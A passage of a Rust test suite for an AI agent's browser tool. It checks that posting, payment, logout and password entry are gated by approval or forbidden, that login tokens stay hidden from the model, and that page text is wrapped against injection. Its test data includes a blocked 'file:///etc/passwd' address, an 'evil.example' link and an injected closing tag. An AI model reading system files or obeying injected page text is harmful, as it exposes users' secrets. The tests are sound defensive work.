use std::sync::{Arc, Mutex};
use std::time::Duration;

use lucia_store::{ApprovalStatus, Store};
use tokio::sync::mpsc;

use super::*;
use crate::browser::fake::{FakeBrowser, FakeNotifier, FakeSecrets, element, link};
use crate::browser::logins::{LoginsConfig, SiteLogins};
use crate::browser::{FormInfo, PageView};

const PAGE: &str = "https://www.example.com/board/1";

fn form(method: &str, action: &str, password: bool) -> FormInfo {
    FormInfo {
        method: method.into(),
        action: action.into(),
        fields: vec![("제목".into(), "안녕".into())],
        hidden: 1,
        password,
    }
}

fn with_form(mut el: Element, f: FormInfo) -> Element {
    el.form = Some(f);
    el
}

fn click(r: &str) -> Act {
    Act::Click { r: r.into() }
}

fn typing(r: &str, submit: bool) -> Act {
    Act::Type {
        r: r.into(),
        text: "고양이".into(),
        submit,
    }
}

#[test]
fn grades_follow_the_spec_permission_levels() {
    let free = |act: &Act, el: &Element| assert_eq!(classify(act, el, PAGE), Gate::Free, "{el:?}");
    // 묻는 동작(가벼운 확인이든 바깥에 남는 쓰기든), 사람 없는 실행이 못 하는 동작. 정확한 등급은
    // `nothing_is_forbidden_by_policy_but_writes_and_money_always_ask`가 본다(결정 0059).
    let approval = |act: &Act, el: &Element| {
        assert!(
            matches!(
                classify(act, el, PAGE),
                Gate::Approval(_) | Gate::Publish(_)
            ),
            "{el:?}"
        )
    };
    let forbidden = |act: &Act, el: &Element| {
        assert!(
            matches!(
                classify(act, el, PAGE),
                Gate::Forbidden(_) | Gate::Critical(_) | Gate::HumanOnly(_)
            ),
            "{el:?}"
        )
    };

    // 읽기: 링크 이동, 펼치기, 탭, 체크, 글 넣기(제출 없이), GET 폼, 스크롤, 뒤로.
    free(
        &click("e1"),
        &link("e1", "다음 글", "https://www.example.com/board/2"),
    );
    free(
        &click("e1"),
        &link("e1", "다른 사이트", "http://news.example.org/a"),
    );
    let mut toggle = element("e2", "button", "메뉴");
    toggle.expanded = Some(false);
    free(&click("e2"), &toggle);
    free(&click("e3"), &element("e3", "tab", "댓글"));
    free(&click("e4"), &element("e4", "checkbox", "동의"));
    free(&click("e5"), &element("e5", "button", "더보기"));
    free(&typing("e6", false), &element("e6", "text", "제목"));
    free(
        &click("e7"),
        &with_form(
            element("e7", "submit", "검색"),
            form("get", "https://www.example.com/search", false),
        ),
    );
    let mut search = element("e8", "text", "검색어");
    search.search = true;
    free(&typing("e8", true), &search);
    free(
        &typing("e9", true),
        &with_form(
            element("e9", "text", "검색어"),
            form("get", "https://www.example.com/s", false),
        ),
    );
    free(&Act::Back, &element("e0", "button", ""));
    free(
        &Act::Scroll {
            to: Scroll::Down,
            at: None,
        },
        &element("e0", "button", ""),
    );

    // 외부 쓰기: POST 제출, 모르는 스크립트 단추, 같은 페이지 스크립트 링크, Enter를 모르는 칸.
    approval(
        &click("e10"),
        &with_form(
            element("e10", "submit", "글 등록"),
            form("post", "https://www.example.com/write", false),
        ),
    );
    approval(
        &typing("e11", true),
        &with_form(
            element("e11", "text", "댓글"),
            form("post", "https://www.example.com/c", false),
        ),
    );
    approval(&click("e12"), &element("e12", "button", "추천"));
    approval(&click("e13"), &link("e13", "추천", "javascript:void(0)"));
    approval(
        &click("e14"),
        &link("e14", "신고", "https://www.example.com/board/1#none"),
    );
    approval(&typing("e15", true), &element("e15", "text", "메모"));
    let mut in_post = element("e16", "button", "더보기");
    in_post.form = Some(form("post", "https://www.example.com/x", false));
    approval(&click("e16"), &in_post);

    // 금지: 결제·탈퇴, 로그아웃, 비밀번호 칸, 로그인 폼, 파일, 비활성, 여러 줄 칸 Enter.
    forbidden(&click("e20"), &element("e20", "button", "결제하기"));
    forbidden(
        &click("e21"),
        &with_form(
            element("e21", "submit", "확인"),
            form("post", "https://shop.example.com/checkout/pay", false),
        ),
    );
    forbidden(
        &click("e22"),
        &link("e22", "로그아웃", "https://www.example.com/logout"),
    );
    forbidden(
        &click("e23"),
        &link("e23", "나가기", "https://www.example.com/member/signout"),
    );
    forbidden(
        &typing("e24", false),
        &element("e24", "password", "비밀번호"),
    );
    forbidden(
        &typing("e25", false),
        &with_form(
            element("e25", "text", "아이디"),
            form("post", "https://www.example.com/login", true),
        ),
    );
    forbidden(
        &click("e26"),
        &with_form(
            element("e26", "submit", "로그인"),
            form("post", "https://www.example.com/login", true),
        ),
    );
    forbidden(&click("e27"), &element("e27", "file", "첨부"));
    let mut off = element("e28", "button", "보내기");
    off.disabled = true;
    forbidden(&click("e28"), &off);
    forbidden(&typing("e29", true), &element("e29", "textarea", "본문"));
    forbidden(&typing("e30", false), &element("e30", "button", "보내기"));
    assert!(
        matches!(
            classify(
                &click("e31"),
                &element("e31", "button", "확인"),
                "https://shop.example.com/order/checkout"
            ),
            Gate::Critical(_)
        ),
        "결제 페이지의 단추"
    );
}

#[test]
fn views_list_elements_with_refs_values_and_grades() {
    let mut text = element("e2", "text", "검색어");
    text.value = Some("고양이".into());
    text.search = true;
    let mut sel = element("e3", "select", "정렬");
    sel.value = Some("최신순".into());
    sel.options = vec!["최신순".into(), "추천순".into()];
    let mut far = element("e5", "button", "추천");
    far.in_view = false;
    let view = PageView {
        url: PAGE.into(),
        title: "게시판".into(),
        text: "본문 ".repeat(6000),
        elements: vec![
            link("e1", "다음 글", "https://www.example.com/board/2"),
            text,
            sel,
            with_form(
                element("e4", "submit", "등록"),
                form("post", "https://www.example.com/w", false),
            ),
            far,
            link("e6", "로그아웃", "https://www.example.com/logout"),
        ],
        element_total: 240,
        login_form: true,
        scroll: (0, 900, 4000),
        dialogs: vec!["저장했습니다".into()],
        ..PageView::default()
    };
    let out = format_view(&view, false);
    assert!(out.contains("주소: https://www.example.com/board/1"));
    assert!(out.contains("스크롤: 0~900px / 전체 4000px"));
    assert!(out.contains("대화상자: 저장했습니다"));
    assert!(out.contains("browser_login(이 주소)"), "로그인 칸 안내");
    assert!(out.contains("…(이하 생략, 전체 18000자"), "본문 상한");
    assert!(out.contains("(240개 중 6개"));
    assert!(out.contains("[e1] 링크 “다음 글” → https://www.example.com/board/2\n"));
    assert!(out.contains("[e2] 입력칸 “검색어” 값=“고양이” (검색 칸)"));
    assert!(out.contains("[e3] 선택 상자 “정렬” 값=“최신순” 선택지: 최신순 | 추천순"));
    assert!(out.contains("[e4] 제출 단추 “등록” [POST → https://www.example.com/w] ⚑승인 필요"));
    assert!(out.contains("[e5] 단추 “추천” (화면 밖) ⚑확인 필요"));
    // 로그아웃은 사람이 대화 중이면 그냥 한다(결정 0059): 표시가 없다.
    assert!(out.contains("[e6] 링크 “로그아웃” → https://www.example.com/logout\n"));

    let compact = format_view(&view, true);
    assert!(!compact.contains("본문 본문"), "스크롤 뒤에는 본문 없이");
    assert!(!compact.contains("[e5]"), "화면 안의 요소만");
}

struct Setup {
    tools: Arc<BrowserTools>,
    browser: Arc<FakeBrowser>,
    posts: mpsc::UnboundedReceiver<String>,
    store: Arc<Mutex<Store>>,
    secrets: Arc<FakeSecrets>,
}

fn setup(wait: Duration) -> Setup {
    let store = Arc::new(Mutex::new(Store::open_in_memory().unwrap()));
    let browser = Arc::new(FakeBrowser::default());
    let (tx, rx) = mpsc::unbounded_channel();
    let secrets = Arc::new(FakeSecrets::default());
    let logins = Arc::new(SiteLogins::new(
        browser.clone(),
        secrets.clone(),
        store.clone(),
        Arc::new(FakeNotifier::default()),
        Some(tx.clone()),
        crate::browser::sites::builtin(),
        LoginsConfig {
            form_base: "http://192.168.0.2:8780".into(),
            input_ttl: chrono::Duration::minutes(10),
            approval_ttl: chrono::Duration::minutes(30),
        },
    ));
    let tools = Arc::new(BrowserTools::new(
        logins,
        Arc::new(Egress::default()),
        None,
        store.clone(),
        Some(tx),
        ToolsConfig {
            approval_wait: wait,
            approval_ttl: chrono::Duration::minutes(5),
            tz: chrono_tz::Asia::Seoul,
        },
    ));
    Setup {
        tools,
        browser,
        posts: rx,
        store,
        secrets,
    }
}

/// 화면 하나를 보여 준 상태로 만든다(요소 참조를 기억하게).
async fn show(s: &Setup, elements: Vec<Element>) {
    let view = PageView {
        url: PAGE.into(),
        title: "게시판".into(),
        text: "본문".into(),
        element_total: elements.len(),
        elements: elements.clone(),
        ..PageView::default()
    };
    s.browser.pages.lock().unwrap().push_back(Ok(view));
    *s.browser.url.lock().unwrap() = PAGE.into();
    for e in elements {
        s.browser.elements.lock().unwrap().insert(e.r.clone(), e);
    }
    let out = s.tools.open(PAGE, Some("chat-1")).await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
}

fn post_button() -> Element {
    with_form(
        element("e4", "submit", "글 등록"),
        form("post", "https://www.example.com/write", false),
    )
}

#[tokio::test]
async fn refs_must_come_from_the_last_view_and_still_match() {
    let s = setup(Duration::from_secs(1));
    let out = s.tools.act(click("e1"), None).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("모르는 요소 참조")),
        "{out:?}"
    );

    show(
        &s,
        vec![link("e1", "다음 글", "https://www.example.com/board/2")],
    )
    .await;
    // 그새 페이지가 그 참조를 다른 요소로 바꿨다.
    s.browser
        .elements
        .lock()
        .unwrap()
        .insert("e1".into(), element("e1", "button", "삭제"));
    let out = s.tools.act(click("e1"), None).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("화면이 바뀌어")),
        "{out:?}"
    );
    assert!(
        !s.browser
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|(k, _)| k == "act"),
        "바뀐 요소는 누르지 않는다"
    );
}

#[tokio::test]
async fn free_actions_run_with_a_recheck_and_refusals_are_logged() {
    let s = setup(Duration::from_secs(1));
    show(
        &s,
        vec![
            link("e1", "다음 글", "https://www.example.com/board/2"),
            link("e2", "로그아웃", "https://www.example.com/logout"),
        ],
    )
    .await;
    let out = s.tools.act(click("e2"), Some("chat-1")).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("로그아웃")),
        "{out:?}"
    );
    assert!(
        s.browser.expects.lock().unwrap().is_empty(),
        "못 하는 동작은 하지 않는다"
    );

    let out = s.tools.act(click("e1"), Some("chat-1")).await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
    let expect = s.browser.expects.lock().unwrap()[0].clone().unwrap();
    assert_eq!(expect.url, PAGE);
    assert!(
        !expect.approved,
        "그냥 한 동작은 확인(confirm)을 받아들이지 않는다"
    );
    let activity = s.store.lock().unwrap().recent_activity(10).unwrap();
    assert!(activity.iter().any(|a| a.kind == "browser_act"));
    assert!(activity.iter().any(|a| a.kind == "browser_refused"));
}

#[tokio::test]
async fn approved_actions_wait_for_the_press_and_return_the_result() {
    let mut s = setup(Duration::from_secs(5));
    show(&s, vec![post_button()]).await;
    let mut done = FakeBrowser::page("등록했습니다", false);
    done.url = "https://www.example.com/board/9".into();
    s.browser.pages.lock().unwrap().push_back(Ok(done));

    let tools = s.tools.clone();
    let pending = tokio::spawn(async move { tools.act(click("e4"), Some("chat-1")).await });
    let id = tokio::time::timeout(Duration::from_secs(2), s.posts.recv())
        .await
        .unwrap()
        .unwrap();
    let approval = s.store.lock().unwrap().approval(&id).unwrap().unwrap();
    assert_eq!(approval.kind, KIND_BROWSER_ACTION);
    assert_eq!(approval.status, ApprovalStatus::Pending);
    assert_eq!(approval.payload["host"], "www.example.com");
    assert!(
        !s.browser
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|(k, _)| k == "act"),
        "누르기 전에는 하지 않는다"
    );
    // 데스크가 승인된 요청을 실행한다.
    let note = s.tools.run_approved(&id, &approval.payload).await.unwrap();
    assert!(note.contains("실행했습니다"), "{note}");
    let out = pending.await.unwrap();
    assert!(
        matches!(&out, Reply::Page(t) if t.starts_with("[사용자가 승인해 실행했다]") && t.contains("등록했습니다")),
        "{out:?}"
    );
    let expect = s.browser.expects.lock().unwrap()[0].clone().unwrap();
    assert!(expect.approved);
    assert_eq!(
        expect.element.form.unwrap().fields,
        [("제목".into(), "안녕".into())]
    );
}

#[tokio::test]
async fn denial_ends_the_wait_and_late_approvals_still_run_for_the_card() {
    let mut s = setup(Duration::from_secs(5));
    show(&s, vec![post_button()]).await;
    let tools = s.tools.clone();
    let pending = tokio::spawn(async move { tools.act(click("e4"), None).await });
    let id = s.posts.recv().await.unwrap();
    s.tools.closed(&id, "사용자가 거절했다");
    let out = pending.await.unwrap();
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("거절")),
        "{out:?}"
    );

    // 기다림이 끝난 뒤 눌렀다: 데몬이 그때 실행하고 결과는 카드에 남는다.
    let mut s = setup(Duration::from_millis(50));
    show(&s, vec![post_button()]).await;
    let out = s.tools.act(click("e4"), None).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("승인 카드")),
        "{out:?}"
    );
    let id = s.posts.recv().await.unwrap();
    let payload = s
        .store
        .lock()
        .unwrap()
        .approval(&id)
        .unwrap()
        .unwrap()
        .payload;
    assert!(s.tools.run_approved(&id, &payload).await.is_ok());
    assert_eq!(
        s.browser
            .calls
            .lock()
            .unwrap()
            .iter()
            .filter(|(k, _)| k == "act")
            .count(),
        1
    );
}

#[tokio::test]
async fn open_checks_the_address_and_login_takes_an_origin() {
    let s = setup(Duration::from_secs(1));
    for bad in [
        "http://10.0.0.1/",
        "https://claude.ai/",
        "file:///etc/passwd",
    ] {
        let out = s.tools.open(bad, None).await;
        assert!(
            matches!(&out, Reply::Note(t) if t.contains("열 수 없는 주소")),
            "{bad}: {out:?}"
        );
    }
    let out = s
        .tools
        .login("https://accounts.example.com/signin", Some("chat-1"))
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("https://accounts.example.com") && t.contains("입력 링크")),
        "{out:?}"
    );
    let out = s
        .tools
        .login("http://accounts.example.com/signin", None)
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("https")),
        "{out:?}"
    );
    let out = s.tools.login("naver", None).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("모르는 사이트")),
        "{out:?}"
    );
}

/// 결정 0063: 알림 받을 곳이 앱이면 `browser_login`이 로그인 입력 카드를 올리고, 모델에게는 카드를 올렸다고만
/// 알린다(링크나 토큰은 모델에게 가지 않는다). 앱이 아니면 예전 그대로 링크를 보냈다고 알린다.
#[tokio::test]
async fn login_tool_reports_the_input_card_when_the_notify_target_is_an_app() {
    let mut s = setup(Duration::from_secs(1));
    {
        let st = s.store.lock().unwrap();
        st.create_client("cl-1", "앱", "app", "h1", chrono::Utc::now())
            .unwrap();
        st.set_setting(
            crate::gateway::keys::NOTIFY_CLIENT,
            "cl-1",
            chrono::Utc::now(),
        )
        .unwrap();
    }
    let out = s
        .tools
        .login("https://accounts.example.com/signin", Some("chat-1"))
        .await;
    let Reply::Note(text) = &out else {
        panic!("{out:?}");
    };
    assert!(
        text.contains("로그인 입력 카드") && text.contains("비밀번호를 묻지 않는다"),
        "{text}"
    );
    assert!(
        !text.contains("/site-login/") && !text.contains("링크를 알림으로"),
        "링크는 모델에게 가지 않는다: {text}"
    );
    let id = s.posts.recv().await.unwrap();
    let card = s.store.lock().unwrap().approval(&id).unwrap().unwrap();
    assert_eq!(card.kind, crate::approvals::KIND_LOGIN_INPUT);
    assert_eq!(card.payload["origin"], "https://accounts.example.com");
    assert_eq!(card.run_id.as_deref(), Some("chat-1"));
    assert!(
        !text.contains(card.payload["token"].as_str().unwrap()),
        "토큰도 모델에게 가지 않는다"
    );
    // 이미 올려 둔 요청이 있으면 그것을 처리하라고 한다(카드를 또 올리지 않는다).
    let out = s
        .tools
        .login("https://accounts.example.com/signin", Some("chat-1"))
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("이미 사용자에게 가 있다")),
        "{out:?}"
    );
    assert!(s.posts.try_recv().is_err());
}

/// 결정 0063: 브라우저 도구가 앱의 넘겨받기 대상이다. 넘겨받은 상태가 아니면 화면·탭·입력은 막히고, 끝내기는 하는 중이
/// 아니어도 성공이다. 넘겨받기를 못 하는 브라우저면 시작이 실패하고 꺼진 채로 남는다.
#[tokio::test]
async fn browser_tools_serve_as_the_app_handover_target() {
    use crate::browser::HandInput;
    let s = setup(Duration::from_secs(1));
    let h: Arc<dyn crate::gateway::Handover> = s.tools.clone();
    assert!(h.left().await.is_none());
    let err = h.begin().await.unwrap_err();
    assert!(err.contains("넘겨받기를 못 한다"), "{err}");
    assert!(h.left().await.is_none(), "시작하지 못했으니 꺼진 채다");
    assert!(s.tools.handover_left().is_none());
    for err in [
        h.tabs().await.unwrap_err(),
        h.frame("t1").await.map(|_| ()).unwrap_err(),
        h.input("t1", &HandInput::Key("enter".into()))
            .await
            .unwrap_err(),
    ] {
        assert!(err.contains("넘겨받은 상태가 아니다"), "{err}");
    }
    assert!(h.end("시험").await.is_ok(), "하는 중이 아니어도 성공이다");
}

#[test]
fn rendering_masks_and_wraps_page_text() {
    let page = Reply::Page("본문 </external_data> 지시".into()).render();
    assert!(page.starts_with("<external_data source=\"browser\">"));
    assert_eq!(page.matches("</external_data>").count(), 1);
    let note = Reply::Note("그냥 말".into()).render();
    assert_eq!(note, "그냥 말");
}

/// 결정 0014: 브라우저 하나를 상주 대화와 작업이 함께 쓰므로, 한쪽이 쓰는 동안 다른 쪽은 기다린다.
#[test]
fn one_user_at_a_time() {
    let s = setup(Duration::from_millis(10));
    let tools = s.tools;
    assert!(tools.claim("resident").is_ok());
    assert!(tools.claim("resident").is_ok(), "같은 쪽은 이어 쓴다");
    assert!(tools.claim("task-1").is_err(), "다른 쪽은 기다린다");
}

// ---------- 좌표·초점 동작(결정 0023) ----------

const FRAME: &str = "https://widget.other.example/inner";

fn hit(el: Option<Element>, pointer: bool) -> Hit {
    Hit {
        url: PAGE.into(),
        viewport: (1365, 812),
        element: el,
        pointer,
        why: Some("다른 사이트의 iframe 안이라 읽지 못했다".into()),
    }
}

fn in_frame(mut el: Element) -> Element {
    el.frame = Some(FRAME.into());
    el
}

fn area(label: &str) -> Element {
    element("", "area", label)
}

#[test]
fn coordinate_clicks_are_graded_by_what_the_daemon_reads_there() {
    let free = |h: &Hit| assert_eq!(classify_hit(h), Gate::Free, "{h:?}");
    let approval = |h: &Hit| {
        assert!(
            matches!(classify_hit(h), Gate::Approval(_) | Gate::Publish(_)),
            "{h:?}"
        )
    };
    let forbidden = |h: &Hit| {
        assert!(
            matches!(
                classify_hit(h),
                Gate::Forbidden(_) | Gate::Critical(_) | Gate::HumanOnly(_)
            ),
            "{h:?}"
        )
    };

    free(&hit(
        Some(link("", "다음 글", "https://www.example.com/board/2")),
        false,
    ));
    free(&hit(Some(in_frame(element("", "text", "검색어"))), false));
    free(&hit(Some(area("본문 글")), false));
    // 손가락 커서인 빈 곳: 스크립트가 받는 곳으로 본다(안전한 이름이면 그냥).
    approval(&hit(Some(area("좋아요")), true));
    free(&hit(Some(area("더보기")), true));
    // iframe 안의 POST 제출·스크립트 단추는 승인, 로그인 폼·결제는 못 함.
    approval(&hit(
        Some(in_frame(with_form(
            element("", "submit", "댓글 등록"),
            form("post", "https://widget.other.example/comment", false),
        ))),
        false,
    ));
    approval(&hit(Some(in_frame(element("", "button", "보내기"))), true));
    forbidden(&hit(
        Some(in_frame(with_form(
            element("", "submit", "로그인"),
            form("post", "https://widget.other.example/login", true),
        ))),
        false,
    ));
    forbidden(&hit(
        Some(in_frame(element("", "button", "결제하기"))),
        true,
    ));
    forbidden(&hit(
        Some(link("", "로그아웃", "https://www.example.com/logout")),
        false,
    ));
    // 확인하지 못한 곳은 승인.
    approval(&hit(None, false));
}

#[test]
fn focus_actions_are_graded_by_the_focused_element() {
    let gate = |act: &Act, f: &Focus| classify_focus(act, PAGE, f);
    let on = |el: Element| Focus::On { element: el };
    let text = |submit| Act::TypeText {
        text: "고양이".into(),
        submit,
    };
    let key = |k: &str| Act::Key { key: k.into() };

    assert_eq!(
        gate(&text(false), &on(in_frame(element("", "text", "검색어")))),
        Gate::Free
    );
    assert!(matches!(
        gate(
            &text(false),
            &on(in_frame(element("", "password", "비밀번호")))
        ),
        Gate::HumanOnly(_)
    ));
    assert!(matches!(
        gate(
            &text(false),
            &on(with_form(
                element("", "text", "아이디"),
                form("post", "https://www.example.com/login", true)
            ))
        ),
        Gate::HumanOnly(_)
    ));
    assert!(matches!(
        gate(&text(false), &Focus::Nothing),
        Gate::Forbidden(_)
    ));
    // 초점을 확인하지 못해도 글자만 넣는 것은 그냥, 넣고 Enter·Enter는 묻는다.
    assert_eq!(
        gate(&text(false), &Focus::Unknown { why: "x".into() }),
        Gate::Free
    );
    assert!(matches!(
        gate(&text(true), &Focus::Unknown { why: "x".into() }),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    assert!(matches!(
        gate(&key("enter"), &Focus::Unknown { why: "x".into() }),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    // 여러 줄 칸·편집 칸(에디터)의 Enter는 줄바꿈: 그냥(2026-11-18 카페 글쓰기).
    assert_eq!(
        gate(
            &key("enter"),
            &on(in_frame(element("", "editable", "본문")))
        ),
        Gate::Free
    );
    assert_eq!(
        gate(&key("enter"), &on(element("", "textarea", "내용"))),
        Gate::Free
    );
    let post_field = with_form(
        element("", "text", "댓글"),
        form("post", "https://www.example.com/comment", false),
    );
    assert_eq!(gate(&text(false), &on(post_field.clone())), Gate::Free);
    assert!(matches!(
        gate(&text(true), &on(post_field.clone())),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    // Enter·Space: 입력칸에서는 제출, 단추에서는 누름.
    assert!(matches!(
        gate(&key("enter"), &on(post_field)),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    assert!(matches!(
        gate(&key("enter"), &on(post_button())),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    assert!(matches!(
        gate(&key("space"), &on(post_button())),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    assert_eq!(
        gate(
            &key("enter"),
            &on(link("", "다음", "https://www.example.com/2"))
        ),
        Gate::Free
    );
    assert!(matches!(
        gate(
            &key("enter"),
            &on(link("", "로그아웃", "https://www.example.com/logout"))
        ),
        Gate::HumanOnly(_)
    ));
    assert!(matches!(
        gate(&key("enter"), &on(element("", "password", "비밀번호"))),
        Gate::HumanOnly(_) | Gate::Approval(_)
    ));
    // 그 밖의 키는 그냥(편집·이동).
    assert_eq!(gate(&key("tab"), &on(post_button())), Gate::Free);
    assert_eq!(
        gate(&key("select_all"), &Focus::Unknown { why: "x".into() }),
        Gate::Free
    );
    assert!(matches!(
        gate(&key("enter"), &Focus::Unknown { why: "x".into() }),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    assert_eq!(gate(&key("enter"), &Focus::Nothing), Gate::Free);
    // 폼 안의 체크 칸·선택 상자에서 Enter는 폼을 제출한다(Chrome 실측): 폼 판단.
    let in_post = |kind: &str| {
        with_form(
            element("", kind, "x"),
            form("post", "https://www.example.com/save", false),
        )
    };
    assert!(matches!(
        gate(&key("enter"), &on(in_post("checkbox"))),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    assert!(matches!(
        gate(&key("enter"), &on(in_post("select"))),
        Gate::Approval(_) | Gate::Publish(_)
    ));
    assert_eq!(
        gate(&key("enter"), &on(element("", "checkbox", "x"))),
        Gate::Free
    );
    assert_eq!(gate(&key("space"), &on(in_post("checkbox"))), Gate::Free);
}

#[tokio::test]
async fn coordinate_clicks_run_free_ones_and_ask_for_the_rest() {
    let mut s = setup(Duration::from_millis(200));
    *s.browser.url.lock().unwrap() = PAGE.into();
    // 화면 밖.
    let out = s.tools.click_at(Point { x: 2000, y: 10 }, None).await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("화면 밖")),
        "{out:?}"
    );
    // 그냥 누르는 곳: 같은 점을 다시 읽어 확인하도록 기대값을 넘긴다.
    s.browser.hits.lock().unwrap().push_back(Hit {
        why: None,
        ..hit(Some(in_frame(element("", "text", "검색어"))), false)
    });
    let out = s
        .tools
        .click_at(Point { x: 300, y: 300 }, Some("chat-1"))
        .await;
    assert!(matches!(out, Reply::Page(_)), "{out:?}");
    let expect = s.browser.expects.lock().unwrap()[0].clone().unwrap();
    assert_eq!(expect.element.frame.as_deref(), Some(FRAME));
    assert!(!expect.approved);
    // 확인하지 못한 곳: 승인 카드(좌표와 까닭이 보인다), 누르기 전에는 하지 않는다.
    s.browser.hits.lock().unwrap().push_back(hit(None, false));
    let out = s
        .tools
        .click_at(Point { x: 310, y: 320 }, Some("chat-1"))
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("승인")),
        "{out:?}"
    );
    let id = s.posts.recv().await.unwrap();
    let a = s.store.lock().unwrap().approval(&id).unwrap().unwrap();
    assert_eq!(a.payload["act"]["kind"], "click_at");
    assert_eq!(a.payload["act"]["at"]["x"], 310);
    assert_eq!(a.payload["expect"]["element"]["kind"], "unknown");
    let card = crate::approvals::browser_card(
        &a,
        lucia_core::ConversationId("dm".into()),
        chrono_tz::Asia::Seoul,
        crate::approvals::CardState::Open,
    );
    let text = lucia_channel::card_text(&card);
    assert!(
        text.contains("(310, 320)") && text.contains("iframe"),
        "{text}"
    );
    assert_eq!(
        s.browser
            .calls
            .lock()
            .unwrap()
            .iter()
            .filter(|(k, _)| k == "act")
            .count(),
        1,
        "승인 전에는 하지 않는다"
    );
}

#[tokio::test]
async fn typing_at_focus_never_reaches_a_password_field() {
    let s = setup(Duration::from_millis(200));
    *s.browser.url.lock().unwrap() = PAGE.into();
    s.browser.focuses.lock().unwrap().push_back(Focus::On {
        element: in_frame(element("", "password", "비밀번호")),
    });
    let out = s
        .tools
        .at_focus(
            Act::TypeText {
                text: "hunter22".into(),
                submit: false,
            },
            Some("chat-1"),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("하지 않았다")),
        "{out:?}"
    );
    assert!(s.browser.expects.lock().unwrap().is_empty());
    // 저장된 동작은 예전 모양(좌표 없는 스크롤)도 읽힌다.
    let old: Act =
        serde_json::from_value(serde_json::json!({"kind": "scroll", "to": "down"})).unwrap();
    assert_eq!(
        old,
        Act::Scroll {
            to: Scroll::Down,
            at: None
        }
    );
}

#[test]
fn views_show_iframes_with_screen_coordinates() {
    let view = PageView {
        url: PAGE.into(),
        title: "게시판".into(),
        text: "본문".into(),
        viewport: (1365, 812),
        frames: vec![crate::browser::FrameView {
            url: FRAME.into(),
            rect: (200, 260, 300, 200),
            text: "위젯 글".into(),
            elements: vec![
                (
                    Point { x: 270, y: 300 },
                    in_frame(element("", "button", "보내기")),
                ),
                (
                    Point { x: 295, y: 355 },
                    in_frame(element("", "text", "검색어")),
                ),
            ],
        }],
        ..PageView::default()
    };
    let text = format_view(&view, false);
    assert!(text.contains("화면: 1365×812"), "{text}");
    assert!(
        text.contains(
            "── iframe 1: https://widget.other.example/inner (화면 200,260부터 300×200) ──"
        ),
        "{text}"
    );
    assert!(text.contains("위젯 글"));
    assert!(
        text.contains("(270, 300) 단추 “보내기” ⚑승인 필요"),
        "{text}"
    );
    assert!(text.contains("(295, 355) 입력칸 “검색어”"), "{text}");
    assert!(
        !format_view(&view, true).contains("위젯 글"),
        "스크롤 뒤에는 글 없이"
    );
}

fn grant(s: &Setup, host: &str, login: bool, actions: bool) -> String {
    s.store
        .lock()
        .unwrap()
        .grant_site(
            &lucia_store::NewSiteGrant {
                id: &format!("g-{host}"),
                host,
                login,
                actions,
                purpose: "시험",
                origin: "chat",
                expires_at: None,
            },
            chrono::Utc::now(),
        )
        .unwrap()
}

fn unattended() -> crate::delegation::Caller {
    crate::delegation::Caller {
        run: "followup-grant-test".into(),
        human: false,
    }
}

fn page_at(url: &str) -> PageView {
    PageView {
        url: url.into(),
        title: "결과".into(),
        text: "결과 본문".into(),
        ..PageView::default()
    }
}

/// 사람 없는 실행(결정 0028·0029): 위임 밖은 열지 않고 카드로 묻는다. 위임 안은 다시 묻지 않는다.
/// 위임이 동작을 허용하면 POST 제출도 묻지 않지만, 금지 동작(로그아웃 등)은 그대로 못 한다(I3).
/// 위임 밖으로 가는 링크는 누르지 않는다. 위임을 거두면 다음 호출부터 다시 막힌다.
#[tokio::test]
async fn unattended_runs_stay_inside_site_grants() {
    let mut s = setup(Duration::from_millis(50));
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.open(PAGE, Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("위임한 사이트가 아니라")),
        "{out:?}"
    );
    let card = s.posts.try_recv().unwrap();
    assert_eq!(
        s.store
            .lock()
            .unwrap()
            .approval(&card)
            .unwrap()
            .unwrap()
            .kind,
        crate::delegation::KIND_SITE_EGRESS
    );
    assert!(
        !s.browser
            .calls
            .lock()
            .unwrap()
            .iter()
            .any(|(k, _)| k == "open"),
        "열지 않았다"
    );

    grant(&s, "example.com", false, true);
    show(
        &s,
        vec![
            post_button(),
            link("e2", "로그아웃", "https://www.example.com/logout"),
            link("e3", "바깥", "https://evil.example/x"),
        ],
    )
    .await;
    s.browser
        .pages
        .lock()
        .unwrap()
        .push_back(Ok(page_at("https://www.example.com/write/ok")));
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.act(click("e4"), Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(out, Reply::Page(_)),
        "동작 위임이면 묻지 않는다: {out:?}"
    );
    assert!(s.posts.try_recv().is_err(), "카드 없음");
    let elements = vec![
        link("e2", "로그아웃", "https://www.example.com/logout"),
        link("e3", "바깥", "https://evil.example/x"),
    ];
    show(&s, elements.clone()).await;
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.act(click("e2"), Some("followup-grant-test")),
        )
        .await;
    assert!(
        matches!(&out, Reply::Note(t) if t.contains("로그아웃")),
        "금지 동작은 위임해도 못 한다: {out:?}"
    );
    show(&s, elements).await;
    let out = crate::delegation::CALLER
        .scope(
            unattended(),
            s.tools.act(click("e3"), Some("followup-grant-test")),
        )
        .await;
    assert!(
